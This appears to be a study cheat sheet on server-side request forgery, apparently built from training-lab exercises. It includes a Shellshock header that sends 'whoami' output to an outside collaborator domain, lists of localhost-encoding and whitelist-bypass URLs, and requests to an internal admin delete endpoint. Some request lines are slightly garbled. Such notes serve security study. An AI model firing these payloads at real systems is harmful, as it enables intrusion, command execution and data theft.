# 🟩 Server-Side Request Forgery (SSRF)

Induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

## <mark style="color:red;">Exploiting</mark>

### <mark style="color:orange;">SSRF against the server itself</mark>

Attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface (EX: http://localhost/admin)

### <mark style="color:orange;">SSRF against other back-end systems</mark>

* Attacker can exploit the SSRF vulnerability to access the other interface by submitting a internal HTTP request (EX: http://192.168.1.105/admin)

### <mark style="color:orange;">Blind SSRF vulnerabilities</mark>

Response from the back-end request is not returned in the application's front-end response

**Find vulnerability**

Observe a DNS look-up for the supplied **Burp Collaborator domain**

**Example (Blind SSRF with Shellshock exploitation)**

```http
GET /path TTP/1.1
Host: test.net
...
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).aaabbbcccdddeeefff.burpcollaborator.net
...
Referer: http://192.168.0.1:8080
Upgrade-Insecure-Requests: 1
Connection: close
```

## <mark style="color:red;">Bypass</mark>

### <mark style="color:orange;">Bypass blacklist-based</mark>

* Change "127.0.0.1" to

```
http://2130706433
http://017700000001
http://127.1
http://127.0.1
http://0.0.0.0
http://0
http://0x7f000001
http://2130706433
http://017700000001
http://[::]:80
```

* Registering your own domain name that resolves to 127.0.0.1. You can use "spoofed.burpcollaborator.net" for this purpose
* Obfuscating blocked strings using URL encoding or case variation. Example

```
value=http://127.1/%25%36%31dmin/delete?username=carlos
```

### <mark style="color:orange;">Bypass whitelist-based</mark>

* Using "@" char `https://expected-host@evil-host.net`
* Using "#" char `https://evil-host#expected-host.net`
* Create a invalid domain `https://expected-host.evil-host.net`
* Use URL-encode characters to confuse the URL-parsing code `http://localhost:80%2523@evil-host.net/admin`

### <mark style="color:orange;">Bypassing SSRF filters via open redirection</mark>

**Exapmle-1**&#x20;

/product/nextProduct?currentProductId=6&<mark style="color:green;">path</mark>=<mark style="color:yellow;">http://192.168.0.68/admin</mark>

**Exapmle-2**

If "/product/stock" vulnerable to SSRF and "/nextProduct" vulnerable to OpenRedirect, Then

```http
// HTTP request

POST /product/stock vulnerable/1.1
Host: test.net
......
Connection: close

api=/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
